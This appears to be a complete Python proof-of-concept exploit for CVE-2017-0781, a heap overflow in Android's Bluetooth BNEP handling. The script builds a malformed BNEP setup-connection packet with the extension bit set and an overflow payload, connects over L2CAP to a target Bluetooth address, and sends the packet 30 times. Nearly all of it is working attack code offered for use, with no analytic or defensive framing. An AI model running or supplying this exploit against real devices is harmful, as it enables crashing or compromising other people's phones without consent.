import bluetooth
 
if not &#039;TARGET&#039; in args:
    log.info(&#039;Usage: python CVE-2017-0781.py TARGET=XX:XX:XX:XX:XX:XX&#039;)
    exit()
 
target = args[&#039;TARGET&#039;]
 
count = 30 # Amount of packets to send
 
port = 0xf # BT_PSM_BNEP
context.arch = &#039;arm&#039;
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01
 
def set_bnep_header_extension_bit(bnep_header_type):
    """
    If the extension flag is equal to 0x1 then
    one or more extension headers follows the BNEP
    header; If extension flag is equal to 0x0 then the
    BNEP payload follows the BNEP header.
    """
    return bnep_header_type | 128
 
def bnep_control_packet(control_type, control_packet):
    return p8(control_type) + control_packet
 
def packet(overflow):
    pkt = &#039;&#039;
    pkt += p8(set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
    pkt += bnep_control_packet(BNEP_SETUP_CONNECTION_REQUEST_MSG, &#039;\x00&#039; + overflow)
    return pkt
 
bad_packet = packet(&#039;AAAABBBB&#039;)
 
log.info(&#039;Connecting...&#039;)
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, 1500)
sock.connect((target, port))
 
log.info(&#039;Sending BNEP packets...&#039;)
for i in range(count):
    sock.send(bad_packet)
 
log.success(&#039;Done.&#039;)
sock.close()

